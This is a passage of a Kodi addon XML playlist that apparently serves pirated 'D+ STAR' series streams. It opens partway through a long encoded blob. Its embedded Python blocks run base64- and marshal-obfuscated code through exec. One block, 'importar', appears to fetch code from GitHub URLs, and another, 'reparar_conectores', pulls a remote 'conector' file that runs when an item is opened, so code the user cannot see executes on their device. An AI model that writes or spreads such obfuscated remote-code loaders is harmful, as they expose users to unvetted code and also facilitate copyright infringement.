STk1FNHlSVEpaVkZsNlRXMUpNMDFFVlhsT1ZGRXhUMFJhYWs1cVozcE9WRkV4VG5wUk1VNUVTbTFPYW1jeVRXcGpNRTE2U1ROUFJGVTFUbnBSZWsxcVl6Vk5iVmt4VG5wYWFFNXFVVE5OZWswMFRXMUpNMDFVVlROT2VsVXlUVlJSTkUxNlRUQlBSRTAxVGxSck0wMXFaR2hPZWxFeFRYcFZlazVIVFhwT1JGazBUa1JSZWs1NldteE9hbFY2VFVSUk1FMXRXVEpOZWsxNFRYcEZNbHBFVlRGTmVrVXlUWHBaZWs1dFVUSk9hbFV5VGtkTk1FMXp5eFVBQUVkYWJFRktVakpOVVhBeFFWRk1NVnBSY0ROYWJWb3hXa2RYZGtGVVdqRmFVVnByUVVkRWJVRlJSREphYlU0eVRVZE1iVUYzV2pGQmJVaHFRVzFJTTBGUlJHeGFiVkl5VEcxYU5VRnRXak5hYlhGMVFWRk1iRXgzU0ROQlVWb3lXbTF3YTBGVVdqSkJVVXd3UVhkU00wRlJXalZCUjBReVdtMXdiRUZ0ZERGQ1IwaHFRVEpTTTBGdFJYZGFiVXd4VEVkd00wRjNVakZCUjFwc1dtMUliVUZIVEd0QlVYaHRRVWRFTUVGSFRtMWFVWEF5UVcxV01rRnRjR3BCVVhRd1FVZFhka0ZSUkRGYVVVZzBXbnBXTWtGM1JEUkJlbEl5VFVkSU0wRkhVakJOVVVReVdtMU9NRnAzY0dwQmVrZ3dURWRGZFVGdGREQk1SMHd5UVZSU2JVRnRjRFJCZDNBeVRYZHdiVnA2VmpCQ1IxbzBRVWQwTTBGUlNEUkJkMHd5V20xYWFscHRUREpOZDBWM1dtMTBNRXh0V20xQmJWb3hRWGRGZVVGNlVqSk1iWEJyUVhwSU1FeEhSREZCYlVnd1RYZEZkMEZVU0RGTVIwVjJRWHBFTWxwM1NHcEJla3d5V20xTU1rRktVak5hVVZvMVFWRndiVUpIVERWQmQzZ3hRVWRhTVVGM1JERkNVVnBxUVZGd2JVRlJURFJCZWtRd1FsRkpkVnB0U0cxQ1VVd3dRVEpTTWsxSFJEVkJVVXd6UWxGd2JFRjZSREpNUjBSdFFWUlNNRTFIVEd0YWJYUXdUWGR3TTBGSFREQk1SMHcwUVhkV01rMUhSWFpCZDBnelduZEVNMEZVVmpCQ1VYQTFRWGRJTWsxUlREQkJkM1F3VEcxSU5VRlJVbXhNZDBReVFVZE9NVnBIY0RWQmQxcHRXbEZNTWtGdGNERmFVVTE1UVcxV01VRkhjR3RCZWtnd1RWRmFiRUZ0V2pOYVIwUnJXbTFFTTFwSGNHeEJVWEF5UVhkTmRVRlVXakJDUjBneVdtMVNNRUZIV2pGYWJYQXdRbEZhYkVGUlJETkJkMHcwUVZGd01VRjNSWHBCZDB4c1RYZE1iVUYzZERGTVIwMTJXbTFhTUUxSFNEUkJSMDR3V25kd01FRjZSRE5CUjB3MVFYZE1NRnB0UlhoQmJYUXpXbmROZUVGdGRHMWFSMDE0UVcxd01FeDNjRE5CTWxJd1RVZHdiVUZIZERKQlIwVjVRVkY0TWtGSGNHdEJSM0F4UWxGRmQxcHRkRE5hVVVWMVFXMVNiVUZIVjNaQmVsWXpRVkZGZUVGdFRHMUJiVVF6UVVkME0xcHRXalZCZWxveVFrZE1Na0ZIVGpGQ1IzQnRRVXBTTTFwM2NETkJiVXh0V25kRU0wRlJTREphZDB3d1FXMWFNMHhIUkRSYWJWSnNUSGRJYlVGdGRESk5VWEYxV20xRU1VeEhUWGxCUjFveVRVZE5lVUZIZERCQ1VVUTBRWHBNTUUxUmNESkJkMUl6UVcxRU1VRktVbTFCYlVsMVFYcEVNVUZSVFhaYWJVeHRRbEZNTTBGUlRETkNVVm93UVZGTWJWcHRSWFZCVVZveFdsRndhbHB0UkRGQ1VVd3lRVXBTYlVGdGNEUkJkMGd3VEhkTWEwRlVXakpCVVVWNFducFdNRUpSUlhwQmJVZ3dXbmRhTlVGNlJHMWFkMHd5UVZSYU0xcEhTREJCZDB3d1dtMWFiVUY2VmpOQlVVd3lRWGQ0YlZwUlRERkJkMGd6V25kYU1GcDZUREJCVVV3eFdtMVdNa3hIVERGQmJWWXpURWRNTkVGdFJERmFVVm8wUVVkME1FRnRjRFJhYlV4dFFVZElNMEZIVEROYVVVUXdRVlJJTVVGM1RERkJVVXh0UWtkd2JWcHRTRE5hVVVReFFXMUlNRUZ0V20xYWJWb3lRVkZGZDBGNlVtMUJkMW93UVcxRU1rMUhSWGRCUjBnelFVZEZla0ZIY0cxYWJVVjRRVzFNTUVGdFJYWkJVVXh0V20xTU5FRnRUbTFCVVV4clducE1NRXh0VjNwWGFqQlliakpKTlc5S1UyVk5TMVowUTBaT1lVUjZWMVpaTVZkbVNVcEpURTFIV214QlMzbE5SRWw1UWtaNk1XWkpkM1ZEYm5kUE5WZ3dVakJCTUd0TlIwb3hRVzh5TVV4SWVtdEZjRk5CWkVKUldtVnZTMUpxVFRKTlRVcFZRV3hCZUd0bVJFbzFZa1ZVZVdsSFUwOXFSVkZUVVZwNmNVVkJlbWQxVEhveFpFbFVlVmh1VVU0MFJuZHhXRUpJVjJwR01qbG5UVE5QYlVkdGVUTkhTVWxOYjFSaWJFUXlRVUZ2TW5GbmNuWTVRVWxWZFVaTlNqbGhjRlJuYTFneGVUUkJWRVZzYjFWWFpscEhSVWh2U0hreVNsUjVRMEZMVjBGSFlVUnBjVXA1VVc1SWF6UnhNMk16VEd3NVVFeEpXakpOTUhsUGNIaFhXbkYzZVd4eFZGTlNRVkZGUkVjeWEweE1lR3BxYjNoWFpuQkhTVU55VVVrMFNuaFhaVnA1VFdOeFZIVjJSbmxKTkVKVVFXSlpNamxTU2xGRmVrVjJaMnR2ZVUxNFdESjFVRmd3Y1ZkQ1NrMUxTbFI1YUUxNlowRk1TbGRLU0VoYU1WcDNSREJ1VTFOclFURldhWEV5T1ZwRlZEQnNRVEpOWW05TGNWUkZValZZV2twbldVMUtkV05hVlVsVFNIbEVhbkZKZFcxRlJqbGlSbUY1ZUVkVFRXZEpiVmRaYmtneGVYQjZjVE5HU2pWcVdtRlBlbTUzUVdGSFZEbFBSRWQ1ZW00eVJXeE5SM0ZNUmxWeGVGa3hkV1pKU1hRMWJucEJlRXhLY0RWQk0wOHhXVzFCZWxreFJXWk1iRGxaUm1GQllrMHhSWGhGTWpsRFJIbEJWM0o0T0ROR01rRkpTSGhyYVVsSWVVWnhNbVp0U1ZRMVRYQlVZekp3U0hWRGJuZDBiVXg2TVZsWU1IRkxSM2hYV0VkSGVUQllNMEUxUm5sMVZYRjRjVnB2UzNsVWNub3hXVUpJVEdwR1UySmxjVXBqYVVFeVp6TkJNMFJyV214bloyOXRUakZ2U0RscVIxSTVlbTlTU0d4SWVGSTFRV0ZJYVUwelFXUnVVbGRKY2tsVFdrZGhVM2R5ZUUxa2IwZDVXVzk0ZUdwR01qRjNXbTFKVDNKNmNXMUtlWFZSYjFGV05FRXlPR3RDVlhBMVJESXhUVWRTU1dGYVZGTlZRVEZKZGsxSlRWaHVlSGsyY2xOMVVrWXpkV2h2TVU5RVFrcFdhWEpMZFhWdmVGSTBjbEZhWlVKTGRESnVNM1JzY0RCNVJVbHRTVTlIU0RGbVJubGplVXBIZFZOQmVWcHBjSGgxZUZodFQyRnhNbXBwYmpOalowUnRVMmx3ZVZObVFVcDVZMGxoY1ZCd1ZHdFhSVXRUWW5KVWRXbElTamxzUjBsWGVrcFZjV3RGUzFObGNuaDFURUpWVm1sdVIzQnNTVWRJWlZreGRHVmFlR3RKUlV0Tk5XNUtSREJZTUhGVWJsSXdhVVl4VG0xYVNYRmlTa3RTTlVKS2ExSnhTMFV5UkRORWJXNHpUMHhKTWxOUFdUQk5Na2QzUVVWR1MxZFpiM2huZDFodFRURnhVM0JwY2xWTlEyNUxRWFpIYlZjMlJHMTVWMFZTUkcxeE0wNXRXbFF4TkZvd1oyaHVWSFV5Y0ZWTldIRjRUWGh4VVZZeWIwZ3hWSEpWVjI1dlNFVlliMjFOTlVaSmRXdEZWREJzY25kT2EwWlVjREJaTW5ReFFsTnhkM0F5T1RWR01sZFpTSGhYYkZwTFUwWk5VR2RTUlZOeFVWcEpZME5IVkhGVVdrdGpkMW94UkRSTlVVNHpjSGhNWlVsTFQzbEdTSEZvVFVwNVptNUhkV1J2TW5VMmNubzVkbHB0U1U5eE0xTlVRVkY1ZFc5NVQyeElVWGxHYmtneFlsb3lWMU5DUzBGb1dqSTVRVnA1U1U5R2JVbGhXREI1Wlc5dGNEVkVNVWw0UlVkTmFHOVVaMmxKUzFONVdESnhNa1l4UVdaS1VEbHJSREZhTWtaU1NHcHlTSFEwUmpCQlpVRXpUVUZ5U25CbGNXMUJaMFl3UldSdVlWTmpTbm94VDFwSlkzbGFTR3RUY0cxQllYSlJWbWxIYkRsaGNFZEpUM0I1VG1WSlNGTTFiM2hYUVVSTFFXZFlNWGxxU2t0eGFtNWhUV3BCTVU5dVdETjVWVVIzY1hWSllYVlhTSGc1V2sweVUzcEdTSFF4V1RGQlFscElOVmxITWsweWNubGpSbTR4ZVdGYWVHTlZjVEZGWmtGNk1XRmFNWFZ1UmpOTWFVRlJUWGROVURsQ2JuaDFXVzk1VnpGeVlYVkpTSGhFTUVSdFFXTkhNakY1V25vMU5sZ3lWbXhNUzNWUlJqRlNaVzh6VjJGTlNEazBURWhtTWxodGNEQndlR2QyU1ZGSmJXNUpRWGh3VURsc2IwdDRNRWQzY1VwdVZGTldiM2hUWVZwaFkxaEVNa2xGUVRGSWEyNTZPV3BZTUhWVFIxTklNRzVKVWpGWU1XSnJUVEZUZDBwTFVqQk5iVVZaY0d4bmVuRlJjVXR5U1VWU1JuZzFXWEpJUlV4SFNqVm1ibE5QUW05SlNUSkJWR2QzVFhwVFFrVXpkV1J4UjFOVmNIZDFhMFI0WjAxdVlVRTFUR3c1YlhCU1l6WnVNakY2V20xV00wWmhTRFZ2U25WVVRETnhVVzU2WjNoRU1tZEpSbmxqTVhFeFlqVkNWVUZIVERKbmVVVjZSREJOVTBsamNGUldaWEpUVjFsdVNERjNibEpyZUVKU01WQklTM0ZyYjFSd2FrZEtaMFJOZWpScVJsRjFhVzVUVjFCYU1VRlBiM2Q1YVVKUmVUVkNVbGRXUmxSSlVFVkxRVEZ1U0dkb2IwaFRkVWt3WjBSTVMwbHRSREZPTlVoSWRWUktSMEZYU0cxeGFreEtXbVZFUm1ZMGJ6SjRiRXA2Y0RGRVlWSnNXbUZQWWtSNVNYbHVZVlpwV0cxeFEyOVVkV2RZYkRscldUTlBaVWxJVm1sSmVYRkJUWGROU1VsaFVtcHllRVF4YnpCcmFFeEthMkp1VkVsMWJsVlhXVUY2U1d4R1lVOHljWGhFTWtwVlZ6UklVVTFuYmtvNVZGcEhTVkZ1VWpScFFrbE5XbTVMZUd0TllVZzFTRWRGV1hCS09YcEtTVWwyYjFSbU5FSkthMlZCWVhWdGJsSXhiRmt4VjNwQk1WTlFSbmhyV1c1SlUxTnhTR05GU2tsQmVVd3llWHBKVkhsU1duaE5WbkZ0ZVd4eFVrVmljbmQ1VEVGS1RESkVZVmRZY25sSlRGbHNabWxHU1U5NlducEZTRVZLTlhoWU1XTnVURXR4YlV3eVYycGFlbmwzUWtwMFpWZ3hTV2R4WVVreFFVcHhOVTF0U1hsSFVuVmhTSHA1VVVSSVUyMU1lalZRUnpONVkwZFNUVFpLUzNsYVIyRjBNSEZoWW0xYVZFMUtiakpxTlVsS09EVk1ZVUZxY25wQk5YQjVUV0pIU0VocVNuWm5SVVo0TlV4SlIzUXpjVlJuYTAwelFVUkdTa1ZxY25samFtNVJWMnR5ZWpsUVJqTkpWRWd6WTFSTlVEbHNRWGx4VUc1NGNWWndTakZJUmtwcWFVUnRSV0phVVhGUVdqQmpkMEpJZFROQk0wMWpXbEZ4WVV4TFRWWk1lR28wUVVkQlNrZExZMjF5VkZkSVJFdHhSVzk1WTFWSk1YVnBUWGg1VDBFeFYxSkZlSFZ0YmtkVFdVUXplR3BHUjBRMVIxVlRXa1o0VERWdlMzVllSM2hCV1VsaFkxVnZiVWxCV2t0MVExcDZlVlp3TTBWbVFsUnJaMjlKVWpSRk1YaGxSVXBYYmsxNGNXdEplSGxYYjFKWFZFMVNURE5JU1ZNMGNFZEVORVl4ZUd0Rk1uQXljWGhYV0VFeVJHeEVla0ZqUkVkeFJFeGhUMVJZTWpocFRHeG5iVzU2U1RWd1UzZ3hjbmRUV0VsUlNVMXdNMU5IV1cxRlNVSlVTR3BIU2xObldrZElha2RWVWpKSVVVUnJjV0ZFTTBrd2VVdGFlalYxY0dGeFNrbFRTVFJ1TTA1dFRHMVhRMXBJV20xeGJHZGxjVkZhTlUwelRXWk5kbVl5Um5wblIzRlFaMlJOTW1adFNWVkVNMjlIVFZCWU1tTktjVXRNYkZwM1JYcHllR2N5UjBsQmFXNXRVM2xHU2psWmNub3hNWEpJU0RWS1Mwd3lTWGhKYlVaTFQzaEJNSEYyV25wSmJVbFZRWFpLUjNsRGNEQndNWEo0VW1WdWVVRmtSVWc1WWxwTFUwdEhWR3BsV2pJMWFHOVRZMWRhU25GcWJrdDRhbTk0WmpSSFZHczJTVzFYVEZwU2RVUnVVVUY2VEVsRWJFeHRUMDFHVkdONWJteG5XVTFSVFRGdVVtdGxRa2hYU1hBeWFtbEllVXhsUVRKblJrZFNjVU5JUzNGWlNVbE5hWEI1VjFoQk1YVnFTbmhFTVV4S09UWnVTMWRoV1RCYU0yOHdRWFZ2TVhVeFducDBNSEI0VTFGQk1uRkpjbUZYTWtZeVNWbHVTV05yVFZKblNGcElTV0pCZUhGMVJuaDVTRXhLZFc1dk1uVlpjVXBUVVUxdFUwaHdlRmRDUVZGd01FUnRXbXhZTVhsSlNVbEZURTE0YWpSSWQwUnRRbE53YTBjd1ptcHVTRmRLUmpBMWExcEtPV1Z3ZW1zeFdUQkJhMEZTVjJ4eVVYbHNjVzFKVVVwNE1YVllNbmw1V0RKTU0xb3lkRzFZTVdOWFFUTkpZa0ZLU1RKWU1YbEhSSGhYYTFwc09VeE1NRk5zVFVoU2FWbHRWMUZ1VlZONWIyRndhbkIzVW1wR2QxcHRjVzE0TTBGM2RVOUZNWEY0V2xSWGVVaHRUR3BHTWxwdFFWTmpXbkJKUVdOR1VrVjFjRzExTVV4NVdtMXhTMWRWU0VsTlFVUnNaMjFDVTBnMGNGQTVaMFp0Y1ZwSFNqbExSVEJKUTNKVWNEVkdTRUZKY1VwMGFXOHdZM1p2ZUVnemIwZDVWMjVKVERGWU1FRjNXVE5qVmxwS1NVaFpNbEpsUlZGMWExa3lVMVZKUmpsMlIwaEpXWEpoY1dkTVIwNDBRVlI0TWsxVlFXdHlVWGhsUmtoQlNFVktjV0Z5Um1jd2NHMUVNbHBoUVc1TVNHWnRjRzF4V0hFeVUzVlpNbXBxYjBoSmJFRjZNVE53TUdkdFRWSmFNVUpVY1RadmVYRkpTa3BUWlZreU9YVmFlRmRXY0RKWGJGZ3pUVzV2VlVGdWNtRjViVzkzZUdsWU1uUnJXbXc1YlhBeWExbEtSMEZxV1RKSmVVWkpZelJhZG1jelRYZEpRWEZHWjB4TVNWTXhjSGhYVFVKSVdtbEZTM0YyUVRKblVVbFRTV1phTW5CcVRYcE1NMDFUUkRGWU1Wb3hSbmR3TVhCNFJXVnZSMGx1UVhwVFkwUktOVkJOWVdJMGJrZDVibHBLVjB0YVNXSnBSSGhpTlVWSlFXVnVTSEZ1U1Vnd00xbHRWMUp3VW5GRlRVaElaVUY2U1c1TU1sSXpXbXhuYTBaTFYyMUJkMEZvUVRGMGJFSkxjRFJCUm1ZelJYZHhWMFl5UkdsTmVFVlpjREZUYmxnelYyRndNMDlyUjFKclZVRXpUM2x2U21jMVdXMU1hVmt4ZUdWeVNuaHBRbE5OZVVSdFYydENSMHhzUWxKTmJYRXpUMjFHTW1Oa1draEJSVUZHT0ROdlVVZzBibmRKVUVsSGNHdHVNRFZ1V1RCTU5FaEhXak5aTTBscFFWRnhZMWt4ZVZGWmJWTTFia2xFTTFwc09HVkJNSEJwV1RGamEyOVZWekZ4YkRsdVRETmpTRUpSVTNwS2VGWnBXakpKWTB4SGRXdEhVVUZtUjFOeFlVaElSVTFaTURoc2NuaHdiVnBTUVhWYVNqbExSMHRCUTBKR09HbEdiWFZyUlVwQk0wcExXakZhUjAxVVFsUkJTVUpVYTJOSk1IVjNSSFk0YVVKSlFXSk1ZVmRaU2tkTlZrWXdaMlJIVkdacFdETmpiRVJJZFhWYU0xb3hSREpxYTFwR1ptcEhNRmRZVFRJNU5FRjRaMlJCUm1jMldXMUlNMEZJWjJaQ1VrRjZXRzExU1ZrelJXMUVTbEp0UVRGMWExa3pUVlJCVlVGWldqQmFhVmx0U1UxQmJEaHBRVzF3YVc5S2NHeEJNVWhwV1RCYU0wWnRXakJaYlhsS2NGSk1OVmx0UldsR01VVnRja2hCTUVOSE1HRlJSR00yYmtvNWFGWlJNSFJYTVdzMFFXMVhjSEpSVFhwTFZYUXpRVk5yTkZwdFUzQnlVVnB0VjJvd1dHOTZTV2xXVVRCMFRVdE5kVzlRZEdGTFZYUXlXbmxyTkVGM2VYQnlVVTE1UzFWME1scEphelJCYlVGd2NsRk1iVXRWZERKQ1NXczBRWGQ1Y0hKUlYzbExWWFF6UVVsck5FRjZTWEJ5VVV3MFMxVjBNa0ZKYXpSQmJYVndjbEZOZDB0VmRESkNTV3MwUVhkTmNISlJjRFZMVlhSc1FsTnJORUY2UlhCeVVVMTZTMVYwTTFwNWF6UkJiVTl3Y2xGTU5FdFZkREpCU1dzMFFXMUpjSEpSY0cxTFZYUnNRa2xyTkZwM1RtRllSazVsVmxSSk1reEthbUpYTVdzMFFYZEJjSEpSVFhwTFZYUXlRVk5yTkVGM1NYQnlVVXh0UzFWME0xb3hhelJhZWtsd2NsRk1NRXRWZERKQlNXczBRWGRCY0hKUlRYcExWWFF5UVZOck5FRjNTWEJ5VVZZMFMxVjBNMEZUYXpSQmJWZHdjbEZNTlV0VmRESk5TV3MwUVhkNWNISlJjREJMVlhRelFrbHJORnA2UVhCeVVWWnFTMVYwTTB4SmF6UkJkM2x3Y2xGTmVrdFZkREpOU1dzMFduZDRZVmhHVG1WV1ZFa3lURXBxWWxjeGF6UkJkMWR3Y2xGTU5VdFZkREpOU1dzMFFYZFRjSEpSY0cxTFZYUXlXakZyTkVGM2VYQnlVVXcxUzFWMGJFMUphelJCYlVsd2NsRk5lVXRWZERKQ1UyczBRWGRKY0hKUmNEUkxWWFF5VERGck5FRjNlWEJ5VVV3eVMxVjBNMEpKYXpSYWQzVndjbEZOZWt0VmRETmFlV3MwUVhkVGNISlJURzFMVlhReVRERnJORUYzU1hCeVVWWTFWMng0ZEZoc1QzbHhlbE5tV0ZCeGNISlJURzFMVlhReVRYbHJORUYzUlhCeVVVd3hTMVYwTWxveGF6UkJiVUZ3Y2xGWGVVdFZkREpCVTJzMFFYZEpjSEpSVEcxTFZYUXlUWGxyTkVGM1JYQnlVVXd4UzFWMGJFSlRhelJCZWxkd2NsRk1NVXRWZEROQ1NXczBRWHBGY0hKUlRHdExWWFF5VEhsck5FRjNTWEJ5VVhCc1MxVjBiRnBUYXpSYWVrRndjbEZXYWt0VmRETk1TV3MwUVhkNWNISlJUWHBMVlhReVRVbHJORnAzZUdGWVJEQllUVXROZFc5UWRYZHZNakZxYmtwcmVWaFZZMlp1U2xab1RWUkpkMjh5TVdwd2VrbHRjR3gxZGt4TFFYbEJkMFJvVEhkTU1FMVVTWGR2TWtWNVdGUkpNa3hLYW1KWE1XczBRWHBKY0hKUlRERkxWWFF5VFhad1kxaEdlR1pYYld0dGNWVlhZMjk2Y0N0WGJHcGhUVXQxZVV4c2NHTllSRDA5ZEFVQUFBQnliM1F4TTNNSkFBQUFiVzl5Y0dobGRYTWdjeHdBQUFCamIyUmxZM011WkdWamIyUmxLSFJ5YVc1cGRIa3NJSHBwYjI0cGRBWUFBQUJ2Y21GamJHVnpIZ0FBQUdOdlpHVmpjeTVrWldOdlpHVW9hMlY1YldGclpYSWdMQ0I2YVc5dUtYUURBQUFBYm1WdmN3Z0FBQUE4YzNSeWFXNW5QblFFQUFBQVpYaGxZeWdMQUFBQWRBWUFBQUJpWVhObE5qUjBCZ0FBQUdOdlpHVmpjM1FJQUFBQWJXOXljR2hsZFhOMEJ3QUFBSFJ5YVc1cGRIbFNCQUFBQUhRSUFBQUFhMlY1YldGclpYSjBCQUFBQUhwcGIyNTBCQUFBQUdWMllXeFNCUUFBQUhRSEFBQUFZMjl0Y0dsc1pYUUpBQUFBWWpZMFpHVmpiMlJsS0FBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwQ0FBQUFEeHRiMlIxYkdVK0FRQUFBSE1PQUFBQUdBRUdBUVlCQmdFR0FRWUJLZ0U9IikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[makelist2.param3]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/cs2OGKr.jpg<thumbnail>
<fanart>https://i.imgur.com/skkYoSC.jpg</fanart>
 </item>
 
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]D+ STAR [COLOR white]Series[/COLOR] </title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
